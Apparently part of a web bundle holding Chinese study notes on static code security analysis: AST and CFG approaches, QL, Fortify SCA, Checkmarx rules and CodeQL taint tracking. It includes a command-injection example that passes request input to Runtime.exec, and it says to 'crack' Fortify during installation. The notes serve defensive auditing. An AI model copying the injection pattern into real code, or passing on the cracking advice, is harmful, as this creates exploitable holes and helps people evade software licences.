                                                1\u3001\u4E5F\u5C31\u662F\u8BF4\uFF0C\u5206\u6790AST\u66F4\u63A5\u8FD1\u5206\u6790\u4EE3\u7801\uFF0C\u6362\u53E5\u8BDD\u5C31\u662F\u8BF4\u57FA\u4E8EAST\u7684\u5206\u6790\u5F97\u5230\u7684\u6D41\uFF0C\u66F4\u63A5\u8FD1\u8111\u5B50\u91CC\u5BF9\u4EE3\u7801\u6267\u884C\u91CC\u7684\u6D41\u7A0B
                                                        1\u3001\u5FFD\u7565\u4E86\u5927\u591A\u6570\u7684\u5206\u652F\u3001\u8DF3\u8F6C\u3001\u5FAA\u73AF\u8FD9\u7C7B\u5F71\u54CD\u6267\u884C\u8FC7\u7A0B\u987A\u5E8F\u7684\u6761\u4EF6
                                                2\u3001\u8FD9\u4E5F\u662F\u57FA\u4E8EAST\u7684\u4EE3\u7801\u5206\u6790\u7684\u666E\u904D\u89E3\u51B3\u65B9\u6848
                                                3\u3001\u5F53\u7136\uFF0C\u4ECE\u7ED3\u679C\u8BBA\u4E0A\u5F88\u96BE\u8FA8\u522B\u5FFD\u7565\u5E26\u6765\u7684\u540E\u679C\u3002
                                        3\u3001\u6240\u4EE5 \u57FA\u4E8EIR/CFG \u8FD9\u7C7B\u5E26\u6709\u63A7\u5236\u6D41\u7684\u89E3\u51B3\u65B9\u6848\uFF0C\u662F\u73B0\u5728\u66F4\u4E3B\u6D41\u7684\u4EE3\u7801\u5206\u6790\u65B9\u6848
                                                \u4F46\u4E0D\u662F\u552F\u4E00\u3002
                                2\u3001\u4EC0\u4E48\u662FIR/CFG
                                        1\u3001IR\uFF1A       \uFF08IntermediateRepresentation\uFF0C\u4E2D\u95F4\u8868\u73B0\uFF09
                                                \u662F\u4E00\u79CD\u7C7B\u4F3C\u4E8E\u6C47\u7F16\u8BED\u8A00\u7684\u7EBF\u6027\u4EE3\u7801\uFF0C\u5176\u4E2D\u5404\u4E2A\u6307\u4EE4\u6309\u7167\u987A\u5E8F\u6267\u884C\u3002\u5176\u4E2D\u73B0\u5728\u4E3B\u6D41\u7684IR\u662F\u4E09\u5730\u5740\u7801\uFF08\u56DB\u5143\u7EC4\uFF09
                                        2\u3001CFG:       \uFF08Control Flow Graph\uFF0C\u63A7\u5236\u6D41\u56FE\uFF09
                                                \u5728\u7A0B\u5E8F\u4E2D\u6700\u7B80\u5355\u7684\u63A7\u5236\u6D41\u5355\u4F4D\u662F\u4E00\u4E2A\u57FA\u672C\u5757\uFF0C
                                                \u5728CFG\u4E2D\uFF0C\u6BCF\u4E00\u4E2A\u8282\u70B9\u4EE3\u8868\u4E00\u4E2A\u57FA\u672C\u5757\uFF0C\u6BCF\u4E00\u4E2A\u8FB9\u4EE3\u8868\u4E00\u4E2A\u53EF\u63A7\u7684\u63A7\u5236\u8F6C\u79FB\uFF0C
                                                \u6574\u4E2ACFG\u4EE3\u8868\u4E86\u6574\u4E2A\u4EE3\u7801\u7684\u7684\u63A7\u5236\u6D41\u7A0B\u56FE\u3002
                                3\u3001\u4ECB\u7ECD\uFF1A
                                        1\u3001\u4E00\u822C\u6765\u8BF4\uFF0C\u6211\u4EEC\u9700\u8981\u904D\u5386IR\u6765\u751F\u6210CFG\uFF0C\u5176\u4E2D\u9700\u8981\u6309\u7167\u4E00\u5B9A\u7684\u89C4\u5219\uFF0C
                                                1\u3001\u4E0D\u8FC7\u4E0D\u5C5E\u4E8E\u8FD9\u91CC\u7684\u4E3B\u8981\u5185\u5BB9\u5C31\u6682\u4E14\u4E0D\u63D0\u3002
                                                2\u3001\u5F53\u7136\uFF0C\u4F60\u4E5F\u53EF\u4EE5\u7528AST\u6765\u751F\u6210CFG\uFF0C\u6BD5\u7ADFAST\u662F\u6BD4\u8F83\u9AD8\u7684\u5C42\u7EA7\u3002
                                        2\u3001\u57FA\u4E8ECFG\u7684\u4EE3\u7801\u5206\u6790\u601D\u8DEF\u4F18\u52BF\u5728\u4E8E\uFF0C
                                                1\u3001\u5BF9\u4E8E\u4E00\u4EFD\u4EE3\u7801\u6765\u8BF4\uFF0C\u4F60\u9996\u5148\u6709\u4E86\u4E00\u4EFD\u63A7\u5236\u6D41\u56FE\uFF08\u6216\u8005\u8BF4\u662F\u6267\u884C\u987A\u5E8F\uFF09\uFF0C\u7136\u540E\u624D\u5230\u6F0F\u6D1E\u6316\u6398\u8FD9\u4E00\u6B65\u3002
                                                        1\u3001\u6BD4\u8D77\u57FA\u4E8EAST\u7684\u4EE3\u7801\u5206\u6790\u6765\u8BF4\uFF0C\u4F60\u53EA\u9700\u8981\u4E13\u6CE8\u4E8E\u4ECESource\u5230Sink\u7684\u8FC7\u7A0B\u5373\u53EF\u3002
                                        3\u3001\u5EFA\u7ACB\u5728\u63A7\u5236\u6D41\u56FE\u7684\u57FA\u7840\u4E0A\uFF0C\u540E\u7EED\u7684\u5206\u6790\u6D41\u7A0B\u4E0EAST\u5176\u5B9E\u522B\u65E0\u592A\u5927\u7684\u5DEE\u522B\uFF0C
                                                1\u3001\u6311\u6218\u7684\u6838\u5FC3\u4ECD\u7136\u7EF4\u6301\u5728  \u5982\u4F55\u63A7\u5236\u6D41\uFF0C\u7EF4\u6301\u4F5C\u7528\u57DF\uFF0C\u5904\u7406\u7A0B\u5E8F\u903B\u8F91\u7684\u5206\u652F\u8FC7\u7A0B\uFF0C\u786E\u8BA4Source\u4E0ESink  \u3002

                        4\u3001\u672A\u6765\u65F6\u671F \u2014\u2014 QL\u6982\u5FF5\u7684\u51FA\u73B0
                                1\u3001QL\u6982\u5FF5\uFF1A
                                        1\u3001\u5168\u79F0\u4E3A Query Language \u67E5\u8BE2\u8BED\u8A00\u3002
                                        2\u3001QL\u6307\u7684\u662F\u4E00\u79CD\u9762\u5411\u5BF9\u8C61\u7684\u67E5\u8BE2\u8BED\u8A00\uFF0C\u7528\u4E8E\u4ECE\u5173\u7CFB\u6570\u636E\u5E93\u4E2D\u67E5\u8BE2\u6570\u636E\u7684\u8BED\u8A00\u3002\u6211\u4EEC\u5E38\u89C1\u7684SQL\u5C31\u5C5E\u4E8E\u4E00\u79CDQL\uFF0C\u4E00\u822C\u7528\u4E8E\u67E5\u8BE2\u5B58\u50A8\u5728\u6570\u636E\u5E93\u4E2D\u7684\u6570\u636E\u3002
                                2\u3001\u5386\u53F2\u53D1\u5C55\uFF1A
                                        1\u3001\u5728\u4EE3\u7801\u5206\u6790\u9886\u57DF\uFF0CSemmle QL\u662F\u6700\u65E9\u8BDE\u751F\u7684QL\u8BED\u8A00\uFF0C
                                                1\u3001\u4ED6\u6700\u65E9\u88AB\u5E94\u7528\u4E8ELGTM\uFF0C\u5E76\u88AB\u7528\u4E8EGithub\u5185\u7F6E\u7684\u5B89\u5168\u626B\u63CF\u4E3A\u5927\u4F17\u514D\u8D39\u63D0\u4F9B\u3002
                                                2\u3001\u4ED6\u4E5F\u662F CodeQL \u7684\u524D\u8EAB\u3002
                                        2\u3001\u7D27\u63A5\u7740\uFF0C CodeQL\uFF08Semmle QL\u7684\u513F\u5B50\u8F88\uFF09 \u4E5F\u88AB\u5F00\u53D1\u51FA\u6765\uFF0C\u4F5C\u4E3A\u7A33\u5B9A\u7684QL\u6846\u67B6\u5728 GitHub \u8FDB\u884C\u4E86\u793E\u533A\u5316\u3002
                                3\u3001QL\u53C8\u548C\u4EE3\u7801\u5206\u6790\u6709\u4EC0\u4E48\u5173\u7CFB\u5462\uFF1F
                                        1\u3001\u300AAST\u6811\u300B\u7684\u65B9\u5F0F\uFF0C\u662F\uFF1A\u6570\u636E\u6D41\u5206\u6790\uFF08Data Flow\uFF09\u3002
                                        2\u3001QL \u5C31\u662F\u628A\u8FD9\u4E2A\u6D41\u7684\u6BCF\u4E00\u4E2A\u73AF\u8282\u5177\u8C61\u5316\uFF0C\u628A\u6BCF\u4E2A\u8282\u70B9\u7684\u64CD\u4F5C\u5177\u50CF\u6210\u72B6\u6001\u7684\u53D8\u5316\uFF0C\u5E76\u4E14\u50A8\u5B58\u5230\u6570\u636E\u5E93\u4E2D\u3002
                                                1\u3001\u8FD9\u6837\u4E00\u6765\uFF0C\u901A\u8FC7\u6784\u9020QL\u8BED\u8A00\uFF0C\u6211\u4EEC\u5C31\u80FD\u627E\u5230\u6EE1\u8DB3\u6761\u4EF6\u7684\u8282\u70B9\uFF0C\u5E76\u6784\u9020\u6210\u6D41\u3002
                                                2\u3001\u4E3E\u4E2A\u4F8B\u5B50
                                                        // Java\u4EE3\u7801
                                                        String eyi_daima = request.get("evil_code")      ;
                                                        String result = System.Runtime.exec( eyi_daima ) ;

                                                        // \u4E2D\u95F4\u5206\u6790
                                                        // \u6211\u4EEC\uFF0C\u7B80\u5355\u7684\u628A\u524D\u9762\u7684\u6D41\u5199\u6210\u4E00\u4E2A\u8868\u8FBE\u5F0F
                                                        System.Runtime.exec <=  request.get & \u65E0\u8FC7\u6EE4\u5668

                                                        // \u5728\u5206\u6790\u8FD9\u7C7B\u6F0F\u6D1E\u7684\u65F6\u5019\uFF0C\u6211\u4EEC\u5C31\u53EF\u4EE5\u76F4\u63A5\u7528QL\u8868\u8FBE
                                                        select * where {
                                                            Source : request.get,
                                                            Sink : System.Runtime.exec,
                                                            \u6709\u987E\u8651\u5668 : False,
                                                        }
                                                3\u3001\u4ECE\u8FD9\u6837\u7684\u4E00\u4E2A\u4F8B\u5B50\u6211\u4EEC\u4E0D\u96BE\u53D1\u73B0\uFF0CQL\u5176\u5B9E\u66F4\u63A5\u8FD1\u4E00\u4E2A\u6982\u5FF5\uFF0C\u4ED6\u9F13\u52B1\u5C06\u4FE1\u606F\u6D41\u5177\u8C61\u5316\uFF0C\u8FD9\u6837\u6211\u4EEC\u5C31\u53EF\u4EE5\u7528\u66F4\u901A\u7528\u7684\u65B9\u5F0F\u53BB\u5199\u89C4\u5219\u7B5B\u9009\u3002
                                        3\u3001\u4E5F\u6B63\u662F\u5EFA\u7ACB\u5728\u8FD9\u4E2A\u57FA\u7840\u4E0A\uFF0CCodeQL\u8BDE\u751F\u4E86\uFF0C
                                                1\u3001\u5B83\u66F4\u50CF\u662F\u4E00\u4E2A\u57FA\u7840\u5E73\u53F0\uFF0C\u8BA9\u4F60\u4E0D\u9700\u8981\u5728\u64CD\u5FC3\u5E95\u5C42\u903B\u8F91\uFF0C\u4F7F\u7528AST\u8FD8\u662FCFG\u53C8\u6216\u662F\u67D0\u79CD\u5E73\u53F0\uFF0C
                                                2\u3001\u4F60\u53EF\u4EE5\u5C06\u81EA\u52A8\u5316\u4EE3\u7801\u5206\u6790\u7B80\u5316\u7EA6\u675F\u4E3A\u6211\u4EEC\u9700\u8981\u7528\u600E\u4E48\u6837\u7684\u89C4\u5219\u6765\u627E\u5230\u6EE1\u8DB3\u67D0\u4E2A\u6F0F\u6D1E\u7684\u7279\u5F81\u3002
                                                3\u3001\u8FD9\u4E2A\u6982\u5FF5\u4E5F\u6B63\u662F\u73B0\u4EE3\u4EE3\u7801\u5206\u6790\u4E3B\u6D41\u7684\u5B9E\u73B0\u601D\u8DEF\uFF0C
                                                        \u4E5F\u5C31\u662F\u5C06\u9700\u6C42\u8F6C\u5AC1\u5230\u66F4\u4E0A\u5C42\u3002


  `),Object(u.c)("Fortify SCA",`

      \u8D44\u6599\uFF1A
              Linux\uFF1A
                      https://www.freebuf.com/sectool/281196.html
              Windows\uFF1A
                      https://blog.csdn.net/qq_40597962/article/details/118490818

      \u5B89\u88C5\uFF1A
              Windows\u4E0B\uFF1A
                      \u6B63\u5E38\u8FD0\u884C\u5B89\u88C5\u5305\uFF0C\u5E76\u7834\u89E3 \u5C31\u53EF\u4EE5\u4E86\u3002
                              1\u3001\u6839\u636E\u5B89\u88C5\u5411\u5BFC\u63D0\u793A\u8FDB\u884C\u8F6F\u4EF6\u5B89\u88C5\uFF0C\u5B89\u88C5\u5230\u8FD9\u4E00\u6B65\uFF0C\u9009\u62E9\u5B8C\u6574\u7684\u8BB8\u53EF\u8BC1\u8DEF\u5F84\uFF0C\u8BB8\u53EF\u8BC1\u6587\u4EF6\u5728\u5B89\u88C5\u5305\u5185\u6709\uFF0C\u8BB8\u53EF\u8BC1\u6587\u4EF6\u540D\u79F0\u4E3Afortify.license

              Linux\u4E0B\uFF0C\u547D\u4EE4\u884C\u6A21\u5F0F\uFF1A
                      1.\u4F7F\u7528ftp/rz\u7B49\u65B9\u5F0F\u4E0A\u4F20\u5B89\u88C5\u5305\u5230\u673A\u5668
                      2.\u8DF3\u8F6C\u81F3\u7CFB\u7EDF\u6839\u76EE\u5F55\u5E76\u89E3\u538B
                      3.\u547D\u4EE4\u884C\u6267\u884CHP_Fortify_SCA_and_Apps_4.40_Linux_x64.run\u8FDB\u884C\u5B89\u88C5
                      4.\u5C06sourceanalyzer\u548Creport-generator-exe.jar\u52A0\u5165\u73AF\u5883\u53D8\u91CF
                              \u5C06report-generator-exe.jar\u52A0\u5165\u73AF\u5883\u53D8\u91CF\uFF0C\u7F16\u8F91/etc/profile\u6587\u4EF6
                      5.\u8BBE\u7F6E\u6E90\u4EE3\u7801\u5B58\u653E\u5730\u5740\uFF1A/httx/svn/applicationName/projectName
                              \u8BBE\u7F6Efortify.py\u5B58\u653E\u8DEF\u5F84\uFF1A/opt/HP_Fortify/fortify.py
                              \u8BBE\u7F6Efortify\u626B\u63CF\u7ED3\u679C\u4E0E\u62A5\u544A\u5730\u5740\uFF1A/httx/fortify_result/

      \u5E38\u89C1\u64CD\u4F5C\uFF1A

              GUI\u6A21\u5F0F\uFF1A
                      Windows\uFF1A
                              1\u3001\u5B89\u88C5\u540E\u6253\u5F00\u6211\u7684\u5DE5\u4F5C\u53F0
                              2\u3001\u5982\u679C\u6E90\u4EE3\u7801\u662Fjava\uFF0C\u9009\u62E9Scan Java\uFF0C\u6E90\u7801\u662FC#\u9009\u62E9Scan VS\uFF0C\u4E0D\u77E5\u9053\u7684\u8BDD\u9009\u62E9Advanced Scan
                              3\u3001\u9009\u62E9\u4EE3\u7801\u6587\u4EF6\u5939\uFF0C\u9009\u62E9jdk\u7684\u7248\u672C
                                      \uFF08\u4E0D\u5EFA\u8BAE\u5C06\u6587\u4EF6\u5939\u62C6\u5F00\uFF0C\u5982\u679C\u6587\u4EF6\u5939\u8FC7\u5927\uFF0C\u53EF\u8981\u6C42\u5F00\u53D1\u4EBA\u5458\u62C6\u5F00\uFF0C\u6309\u6587\u4EF6\u5939\u5206\u5F00\u626B\u63CF\uFF09
                              4\u3001\u6839\u636E\u60C5\u51B5\u9009\u62E9\u540E\uFF0C\u70B9\u51FBScan\uFF0C\u7B49\u5F85\u626B\u63CF
                              5\u3001\u626B\u63CF\u540E\u7684\u754C\u9762\uFF1A
                                      \u754C\u9762\u56FE\u7247\u5730\u5740\uFF1A
                                              https://img-blog.csdnimg.cn/20210705152633144.png

                                      \u5DE6\u4E0A\uFF1A\u6F0F\u6D1E\u5206\u7EA7\u4FE1\u606F
                                      \u5DE6\u4E0B\uFF1A\u6F0F\u6D1E\u4EA7\u751F\u7684\u5168\u8DEF\u5F84\u8DDF\u8E2A\u4FE1\u606F
                                      \u4E2D\u4E0A\uFF1A\u9879\u76EE\u7684\u6E90\u4EE3\u7801
                                      \u4E2D\u4E0B\uFF1A\u591A\u4E2A\u9762\u677F\uFF0C\u9ED8\u8BA4\u662FDetail\u2014\u2014\u2014\u2014\u6F0F\u6D1E\u7684\u8BE6\u7EC6\u4FE1\u606F
                                      \u53F3\u4E0A\uFF1A\u63A8\u8350\u7684\u4FEE\u590D\u4FE1\u606F
                              6\u3001\u53EF\u901A\u8FC7\u83DC\u5355\u680F\u8FDB\u884C\u754C\u9762\u7684\u7EC4\u4EF6\u7684\u914D\u7F6E
                              7\u3001\u5BF9\u7ED3\u679C\u8FDB\u884C\u5206\u6790\uFF0C\u586B\u5199\u5206\u6790\u7ED3\u8BBA\u53CA\u5907\u6CE8\u4FE1\u606F
                              8\u3001\u70B9\u51FB\u83DC\u5355\u680F\u7684 Reports \uFF0C\u9009\u62E9\u5BA1\u8BA1\u89C4\u5219\uFF0C\u5BFC\u51FA\u5373\u53EF

              \u547D\u4EE4\u884C\u6A21\u5F0F\uFF1A
                      Fortify\u626B\u63CF\u7684\u76F8\u5173\u7A0B\u5E8F\u5728bin\u6587\u4EF6\u5939\u4E0B\u7684sourceanalyzer\uFF0C\u4E3B\u8981\u7531\u4EE5\u4E0B\u51E0\u4E2A\u6B65\u9AA4\uFF1A
                              1.\u9759\u6001\u4EE3\u7801\u626B\u63CF\u7684\u7B2C\u4E00\u6B65\uFF1A\u4E3A\u4E86\u907F\u514D\u91CD\u540D\u6216\u6E05\u9664\u5DF2\u7ECF\u5B58\u5728\u7684\u9879\u76EE\uFF0C\u6B64\u5904\u6E05\u9664id\u4E3Atest\u7684\u9879\u76EE
                                      sourceanalyzer -b test -clean
                              2.\u9759\u6001\u4EE3\u7801\u626B\u63CF\u7684\u7B2C\u4E8C\u6B65\uFF1A\u5C06\u6307\u5B9A\u5C06\u8981\u626B\u63CF\u7684\u7CFB\u7EDF\u6E90\u7801/httx/svn/test\u3010\u8868\u793A\u626B\u63CFtest\u6587\u4EF6\u5939\u4E0B\u7684\u6240\u6709\u6587\u4EF6\u3011\uFF0C\u5E76\u521B\u5EFA\u9879\u76EE\u540Dtest\uFF0C\u4EE5\u6B64\u540C\u65F6\u5DF2\u5C06\u6E90\u7801\u8F6C\u6362\u4E3A\u9002\u5408fortify\u626B\u63CF\u7684\u4E2D\u95F4\u4EE3\u7801\u3002
                                      sourceanalyzer -b test /httx/svn/test
                              3.\u9759\u6001\u4EE3\u7801\u626B\u63CF\u7684\u7B2C\u4E09\u6B65\uFF1A\u67E5\u770B\u626B\u63CF\u4EE3\u7801\u8F6C\u6362\u4E3A\u4E2D\u95F4\u4EE3\u7801\u662F\u5426\u6210\u529F
                                      sourceanalyzer -b test -show-files
                              4.\u9759\u6001\u4EE3\u7801\u626B\u63CF\u7684\u7B2C\u56DB\u6B65\uFF1A\u6B63\u5F0F\u8FDB\u5165\u626B\u63CF\u9636\u6BB5
                                      sourceanalyzer -b test -Xmx1250m -scan -f test.fpr
                              5.\u751F\u6210\u62A5\u544A\u76F8\u5173jar\u6587\u4EF6\u5728Core\\lib\\exe\\report-generator-exe.jar\u4E0B\uFF0C\u53EF\u4EE5\u901A\u8FC7\u547D\u4EE4\u8FDB\u884C\u8FD0\u884C\uFF0C
                                      1\u3001\u6807\u51C6\u683C\u5F0F\u4E3A\uFF1A
                                              \u7565
                                      2\u3001\u6839\u636Efortify\u626B\u63CF\u7ED3\u679Cxx.fpr\u6587\u4EF6\u751F\u6210xml\u62A5\u544A\uFF1A
                                              \u7565
                                      3\u3001\u6839\u636Efortify\u626B\u63CF\u7ED3\u679Cxx.fpr\u6587\u4EF6\u751F\u6210pdf\u62A5\u544A\uFF1A
                                              \u7565
                                      4\u3001\u4E00\u822C\u7B80\u5355\u8F93\u51FA\u683C\u5F0F\u4E3A-verbose \uFF0C\u6F0F\u6D1E\u7EC6\u8282\u8BE6\u7EC6\u67E5\u770B\u4F7F\u7528-template DeveloperWorkbook.xml

      \u5E38\u89C1\u6A21\u5757\uFF1A
              \u8FC7\u6EE4\u5668
              \u6E90\u7801\u67E5\u770B\u6846
              \u81EA\u5B9A\u4E49\u89C4\u5219\uFF08\u4E5F\u53EF\u4EE5\u5BFC\u5165\u5916\u90E8\u89C4\u5219\uFF09
              \u751F\u6210\u62A5\u544A\uFF08\u5BFC\u51FA\u4E3A\u62A5\u544A\uFF09

  `),Object(u.c)("CheckMarx",`


      \u5206\u4E3A\u4E24\u79CD\u5BA2\u6237\u7AEF\uFF1A
              \u7F51\u9875\u7248\u3001\u5BA2\u6237\u7AEF\u7248\u3002

      \u81EA\u5B9A\u4E49\u89C4\u5219\uFF1A
          \u89C1\u4E00\u4E9B\u89C4\u5219\u7684\u63CF\u8FF0\u3002

          \u67E5\u627E\u300AStruts2\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u300B\u7684\u89C4\u5219
              \u8D44\u6599\uFF1Ahttps://www.binqsoft.com/bq-security/311

              \u5185\u5BB9\uFF1A\uFF08\u6307 \u7F51\u4E0A\u522B\u4EBA\u5199\u7684\u89C4\u5219\u6587\u4EF6 \u7684\u5185\u5BB9\uFF09
                  3. \u81EA\u5B9A\u4E49\u89C4\u5219\u4E09\uFF08\u547D\u4EE4\u6CE8\u5165\u8F93\u51FA\uFF09

                      \u89C4\u5219\u540D\u79F0\uFF1AFind_Command_Injection_Outputs
                      \u89C4\u5219\u5185\u5BB9\uFF1A
                      result = base.Find_Command_Injection_Outputs();
                      result.Add(All.FindByName("com.mkyong.common.action.FileUploadAction.execute") +
                      All.FindAllReferences(All.FindDefinition(All.FindByName("com.mkyong.common.action.FileUploadAction.execute"))) +
                      All.FindAllReferences(All.FindByName("com.mkyong.common.action.FileUploadAction.execute"))+
                      All.FindByMemberAccess("FileUploadAction.execute"));
                      result.Add(All.FindByName("com.mkyong.common.action.FileUploadAction") +
                      All.FindAllReferences(All.FindDefinition(All.FindByName("com.mkyong.common.action.FileUploadAction"))) +
                      All.FindAllReferences(All.FindByName("com.mkyong.common.action.FileUploadAction")));

  `),Object(u.c)("CodeQL",`

  CodeQL

      \u8D44\u6599\uFF1A
              https://www.freebuf.com/articles/web/283795.html

      \u4ECB\u7ECD\uFF1B
              GitHub\u81EA\u7528\u3002

      \u539F\u7406\uFF1A
              1\u3001\u4F7F\u7528CodeQL\u5F15\u64CE\uFF0C\u5C06\u6E90\u4EE3\u7801\uFF0C\u8F6C\u6362\u6210CodeQL\u53EF\u4EE5\u8BC6\u522B\u7684database(micro-service-seclab-database)
                      1\u3001\u8FD9\u4E2A\u8FC7\u7A0B\u5F53\u4E2D\uFF0CCodeQL\u5F15\u64CE\u628A\u6211\u4EEC\u7684java\u4EE3\u7801\u8F6C\u6362\u6210\u4E86\u53EF\u8BC6\u522B\u7684 \u300AAST\u6570\u636E\u5E93\u300B \u3002
                                \u5373 Abstract Symbol Tree \u62BD\u8C61\u8BED\u6CD5\u6811\u3002

      \u4E24\u79CD\u642D\u5EFA\u65B9\u5F0F\uFF1A
              1\u3001\u79C1\u6709\u65B9\u5F0F\uFF1A\u672C\u5730\u642D\u5EFA\u3002
                      1\u3001\u9996\u5148\uFF0C\u4E0B\u8F7DGitHub\u4E0A\u9762\u7684 \u300A\u5F15\u64CE\u5DE5\u5177\u5305\u300B \u548C \u300ASDK\u89C4\u5219\u5305\u300B \u3002
                      2\u3001\u4F7F\u7528 VsCode \u7684\u3010CodeQL\u4E13\u7528\u63D2\u4EF6\u3011
                              1\u3001\u8BBE\u7F6E\u3010CodeQL\u5F15\u64CE\u8DEF\u5F84\u3011\u3002
                      3\u3001\u7136\u540E\uFF0C\u4F7F\u7528\u547D\u4EE4\u884C\uFF0C\u5BF9\u3010\u73B0\u6709\u6E90\u7801\u9879\u76EE\u3011\u8FDB\u884C\u7F16\u8BD1
                              database create ~/<\u5BFC\u51FA\u7ED3\u679C\u5730\u5740>  --language="java"  --command="mvn clean install --file pom.xml" --source-root=~/<\u9879\u76EE\u5730\u5740>
                      4\u3001\u7136\u540ECodeQL\uFF0C\u4F1A\u5BF9\u5176\u4E2D\u7684class\u5B57\u8282\u7801\u6587\u4EF6\uFF0C\u8FDB\u884C\u5206\u6790\u3002


              2\u3001\u5F00\u6E90\u65B9\u5F0F\uFF1A\u53EF\u4EE5\u4F7F\u7528\u3010LGTM\u3011\u7F51\u7AD9\u4E0A\u4F20\u3002


      \u89C4\u5219\u7684\u57FA\u672C\u7F16\u5199\uFF1A
              1\u3001\u672C\u8D28\u4E0A\uFF0C\u662F\u67E5\u627E \u4E00\u6574\u6761 \u653B\u51FB\u94FE\u3002
              2\u3001\u57FA\u672C\u8BED\u6CD5\uFF1A
                      1\u3001\u7C7B\u4F3C\u4E8E SQL\u67E5\u8BE2 \u3002
                      2\u3001\u793A\u4F8B\uFF1A
                              from [datatype] var
                              where condition(var = something)
                              select var

              3\u3001\u4E00\u4E9B\u8BED\u6CD5\u6982\u5FF5\uFF1A
                      1\u3001\u300AMethod\u3001MethodAccess\u3001Parameter\u300B
                              \u4E3E\u4F8B\uFF1A
                                      import java

                                      from Method method
                                      where method.hasName("getStudent")
                                      select method.getName() ,         // \u83B7\u53D6\u7684\u662F\u5F53\u524D\u65B9\u6CD5\u7684\u540D\u79F0
                                             method.getDeclaringType()  // \u83B7\u53D6\u7684\u662F\u5F53\u524D\u65B9\u6CD5\u6240\u5C5Eclass\u7684\u540D\u79F0
                      2\u3001\u8C13\u8BCD\uFF0Cpredicate
                              \u7C7B\u4F3C\u4E8E\uFF0CJava\u4E2D\u51FD\u6570\u7684\u6982\u5FF5\u3002
                                      \u4F20\u5165\u4E00\u4E2A\u53C2\u6570\uFF0C\u7ECF\u8FC7\u4EE3\u7801\u6D41\u7A0B\u5904\u7406\uFF0C\u8FD4\u56DE\u4E00\u4E2A\u7ED3\u679C\u503C\u3002
                              \u4E3E\u4F8B\uFF1A
                                      predicate isStudent(Method method) {
                                              exists(  method.hasName("getStudent")  )
                                      }
                      3\u3001\u653B\u51FB\u94FE\u76F8\u5173\uFF0CSource\u548CSink
                              1\u3001\u5728\u4EE3\u7801\u81EA\u52A8\u5316\u5B89\u5168\u5BA1\u8BA1\u7684\u7406\u8BBA\u5F53\u4E2D\uFF0C\u6709\u4E00\u4E2A\u6700\u6838\u5FC3\u7684\u4E09\u5143\u7EC4\u6982\u5FF5\uFF0C\u5C31\u662F(source\uFF0Csink\u548Csanitizer)\u3002
                                      1\u3001source\uFF0C\u662F\u6307\u6F0F\u6D1E\u6C61\u67D3\u94FE\u6761\u7684\u8F93\u5165\u70B9\u3002
                                              \u6BD4\u5982\u83B7\u53D6http\u8BF7\u6C42\u7684\u53C2\u6570\u90E8\u5206\uFF0C\u5C31\u662F\u975E\u5E38\u660E\u663E\u7684Source\u3002
                                      2\u3001sink\u662F\u6307\u6F0F\u6D1E\u6C61\u67D3\u94FE\u6761\u7684\u6267\u884C\u70B9\uFF0C
                                              \u6BD4\u5982SQL\u6CE8\u5165\u6F0F\u6D1E\uFF0C\u6700\u7EC8\u6267\u884CSQL\u8BED\u53E5\u7684\u51FD\u6570\u5C31\u662Fsink(\u8FD9\u4E2A\u51FD\u6570\u53EF\u80FD\u53EBquery\u6216\u8005exeSql\uFF0C\u6216\u8005\u5176\u5B83)\u3002
                                      3\u3001sanitizer\u53C8\u53EB\u51C0\u5316\u51FD\u6570\uFF0C\uFF08\u8FC7\u6EE4\u51FD\u6570\u3001\u8FC7\u6EE4\u5668\uFF09
                                              \u662F\u6307\u5728\u6574\u4E2A\u7684\u6F0F\u6D1E\u94FE\u6761\u5F53\u4E2D\uFF0C\u5982\u679C\u5B58\u5728\u4E00\u4E2A\u65B9\u6CD5\u963B\u65AD\u4E86\u6574\u4E2A\u4F20\u9012\u94FE\uFF0C\u90A3\u4E48\u8FD9\u4E2A\u65B9\u6CD5\u5C31\u53EBsanitizer\u3002

                              2\u3001\u53EA\u6709\u5F53source\u548Csink\u540C\u65F6\u5B58\u5728\uFF0C\u5E76\u4E14\u4ECEsource\u5230sink\u7684\u94FE\u8DEF\u662F\u901A\u7684\uFF08\u5373\uFF0C\u6CA1\u6709\u88AB\u8FC7\u6EE4 \u6216 \u8FC7\u6EE4\u4E0D\u5B8C\u5168\uFF09\uFF0C\u624D\u8868\u793A\u5F53\u524D\u6F0F\u6D1E\u662F\u5B58\u5728\u7684\u3002

                      4\u3001Flow\u6570\u636E\u6D41
                              1\u3001\u8BBE\u7F6E\u597DSource\u548CSink\uFF0C\u5C31\u76F8\u5F53\u4E8E\u641E\u5B9A\u4E86\u9996\u5C3E\uFF0C\u4F46\u662F\u9996\u5C3E\u662F\u5426\u80FD\u591F\u8FDE\u901A\u624D\u80FD\u51B3\u5B9A\u662F\u5426\u5B58\u5728\u6F0F\u6D1E\uFF01
                                      \u4E00\u4E2A\u53D7\u6C61\u67D3\u7684\u53D8\u91CF\uFF0C\u80FD\u591F\u6BEB\u65E0\u963B\u62E6\u7684\u6D41\u8F6C\u5230\u5371\u9669\u51FD\u6570\uFF0C\u5C31\u8868\u793A\u5B58\u5728\u6F0F\u6D1E\uFF01
                              2\u3001\u8FD9\u4E2A\u8FDE\u901A\u5DE5\u4F5C\u5C31\u662F \u300ACodeQL\u5F15\u64CE\u300B \u672C\u8EAB\u6765\u5B8C\u6210\u7684\u3002\u6211\u4EEC\u901A\u8FC7\u4F7F\u7528 config.hasFlowPath(source, sink) \u65B9\u6CD5\u6765\u5224\u65AD\u662F\u5426\u8FDE\u901A\u3002
                              3\u3001\u4EE3\u7801\u793A\u4F8B\uFF1A
                                      from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink
                                      where config.hasFlowPath(source, sink)
                                      select source.getNode(), source, sink, "source"
              4\u3001\u8BEF\u62A5\u89E3\u51B3
                      1\u3001\u4E3E\u4F8B\uFF0C\u6211\u4EEC\u5728\u4E0A\u9762\u81EA\u52A8\u5BA1\u8BA1\u51FA\u6765\u7684SQL\u6CE8\u5165\u6F0F\u6D1E\u5F53\u4E2D\uFF0C\u53D1\u73B0\u4E86\u4E00\u4E2A\u8BEF\u62A5\u95EE\u9898\u3002
                              1\u3001\u6211\u4EEC\u9700\u8981\u91C7\u53D6\u624B\u6BB5\u6D88\u9664\u8FD9\u79CD\u8BEF\u62A5\u3002
                                      \u8FD9\u4E2A\u624B\u6BB5\u5C31\u662FisSanitizer\u3002
